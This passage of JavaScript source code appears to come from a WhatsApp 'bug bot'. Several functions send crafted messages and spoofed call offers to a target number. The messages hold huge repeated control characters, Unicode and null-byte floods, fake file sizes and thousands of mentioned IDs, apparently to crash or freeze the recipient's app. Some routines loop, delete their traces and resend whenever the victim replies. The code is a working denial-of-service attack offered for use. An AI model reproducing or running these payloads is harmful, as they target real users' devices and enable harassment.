            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "$",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "$",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    const msg4 = {
      viewOnceMessage: {
        message: {
          groupMentionMessage: {
            message: {
              interactiveResponseMessage: {
                contextInfo: {
                  remoteJid: "target",
                  mentionedJid: ["13135559098@s.whatsapp.net"],
                },
                body: {
                  text: "🩸",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+131358790202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                  version: 3,
                },
              },
            },
          },
        },
      },
    };

    const msg5 = {
      interactiveMessage: {
        header: {
          locationMessage: {
            degreesLatitude: 9999999999,
            degreesLongitude: -9999999999,
            name: "ꦽ".repeat(15000) + "\0".repeat(15000),
            address: "$" + "{".repeat(30000),
            comment: "ꦾ".repeat(10000),
          },
        },
      },
    };

    const messages = [msg4, msg5];
    for (const msg of messages) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }],
              },
            ],
          },
        ],
      });
    }

    const mentions = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net"
        )
    ];

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo=",
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI=",
        },
    ];

    const mediaData2mrb = [
        {
            ID: "69680D38",
            uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
            mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI=",
        },
        {
            ID: "69680D38",
            uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
            sid: "5e03e0",
            SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
            ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
            mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU=",
        },
        {
            ID: "696C0CE0",
            uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
            sid: "5e03e0",
            SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
            mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac=",
        },
    ];

    const extendedMsg = {
        extendedTextMessage: {
            text: "$$$$$",
            locationMessage: {
                degressLatitude: 617267,
                degressLongitude: -6172677,
                isLive: true,
                accuracyInMetters: 100,
                jpegThumbnail: null,
            },
            contextInfo: {
                forwardingScore: 9471,
                isForwarded: true,
                mentionedJid: mentions,
                participant: target,
                stanzaId: target,
                entryPointConversionSource: "notification",
                remoteJid: target,
            },
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 3,
            },
        },
        mediaData: [...mediaDatamrb, ...mediaData2mrb],
    };

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: extendedMsg
        }
    }, {
        participant: { jid: target }
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}

async function gsIntjav(sock, target, otaxkiw = true) {
  for (let i = 0; i < 10; i++) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "12037205250208@newsletter",
            newsletterName: "do u know me? | Information",
            serverMessageId: 1000,
            accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"Otax?","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await sock.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, participant: { jid: target }, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
        participant: target
      }
    })
  }

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return

    for (const msg of messages) {
      if (!msg.message) continue
      if (msg.key.fromMe) continue
      if (msg.key.remoteJid !== target) continue

      try {
        await sock.relayMessage(
          target,
          viewOnceMsg,
          {
            messageId: sock.generateMessageTag()
          }
        )
      } catch {}
    }
  })
}

async function Truenullv4(sock, target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "VONREX🐉", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}

async function iosX(sock, target) {
let msg = generateWAMessageFromContent(cx, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/577313004_1396042095336744_3502303966329446087_n.enc?ccb=11-4&oh=01_Q5Aa3gEgeQo-cEIvQ4k8hdG8jL1_wM5a5Gu5LU_noz7DD_7vkQ&oe=699D4EA0&_nc_sid=5e03e0&mms3=true",
    "mimetype": "font/ttf",
    "fileSha256": "zwcuDa1N8m5NUhc8ULlnfj/caWJ/UOFOyKZbF4OCnY0=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "bYXd51OtQqwZfSKkQZVf649q7Sup6Bsw8BN3Gcl3hY4=",
    "fileName": "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666.ttf",
    "fileEncSha256": "0oE81rg9hgVtlsfnzFLzBToBK3tbeVyMow6z2tyOoqg=",
    "directPath": "/v/t62.7119-24/577313004_1396042095336744_3502303966329446087_n.enc?ccb=11-4&oh=01_Q5Aa3gEgeQo-cEIvQ4k8hdG8jL1_wM5a5Gu5LU_noz7DD_7vkQ&oe=699D4EA0&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1769337798",
    "caption": "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(60000),
    "contextInfo": {
      "participant": "13135559098@s.whatsapp.net",
      "externalAdReply": {
        "automatedGreetingMessageShown": true,
        "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
        "greetingMessageBody": "\u0000"
      }
    }
  }
}), { userJid: cx });

  await sock.relayMessage(cx, msg.message, {
    participant: { jid: cx },
    messageId: msg.key.id
  });
}

async function TsxDex(target) { 
    const msg = generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "By : V-Arven Pro!!",
                  matchedText: "https://t.me/Bayysenpay",
                  description: "!.",
                  title: "",
                  paymentLinkMetadata: {
                    button: { displayText: "\x30" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(70000) }
                  }
                }
              }
            }
          }
        }
      },
      {}
    )

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: null, participant: { jid: target } }
    )
}

async function croserds(sock, target) {
  if (!global.__flyingLimit) global.__flyingLimit = {};
  if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

  const delay = ms => new Promise(r => setTimeout(r, ms));

  global.__flyingMutex = global.__flyingMutex.then(async () => {
    let last = global.__flyingLimit[target] || 0;
    let now = Date.now();
    let wait = last + (1000 + Math.random() * 500) - now;
    if (wait > 0) await delay(wait);
    global.__flyingLimit[target] = Date.now();
  });

  await global.__flyingMutex;

  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let arrayMsg = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
        return memek.mutex(jid, async () => {
          let { type, ciphertext } =
            await sock.signalRepository.encryptMessage({
              jid,
              data: bytes
            });

          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: { v: '2', type, ...extraAttrs },
              content: ciphertext
            }]
          };
        });
      })
    );

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: '0' }
    );

  let callId = crypto.randomBytes(16)
    .toString("hex")
    .slice(0, 64)
    .toUpperCase();

  let callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": callId,
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        {
          tag: "capability",
          attrs: { ver: "1" },
          content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
        },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity
          ? [{
              tag: "device-identity",
              attrs: {},
              content: encodeSignedDeviceIdentity(
                sock.authState.creds.account,
                true
              )
            }]
          : [])
      ]
    }]
  };

  await sock.sendNode(callNode);

  setTimeout(async () => {
    try {
      await sock.sendNode({
        tag: "call",
        attrs: {
          to: target,
          id: sock.generateMessageTag(),
          from: sock.user.id
        },
        content: [{
          tag: "terminate",
          attrs: {
            "call-id": callId,
            reason: "success"
          }
        }]
      });
    } catch {}
  }, 3000);
  try {
    for (let i = 0; i < 100; i++) {
      await sock.relayMessage(
        "status@broadcast",
        {
          groupStatusMessageV2: {
            message: {
              extendedTextMessage: {
                text: "Xata" + "𑇂𑆵𑆴𑆿".repeat(40000)
              }
            }
          }
        },
        {
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                tag: "to",
                attrs: { jid: target }
              }]
            }]
          }]
        }
      );
    }
  } catch {}
}

async function hardblankkelra(sock, target) {
  const KuNtoL = 'ꦾ'.repeat(11000);
  const Baster = 'ꦿꦸ'.repeat(10000);
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==", 'base64'),
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
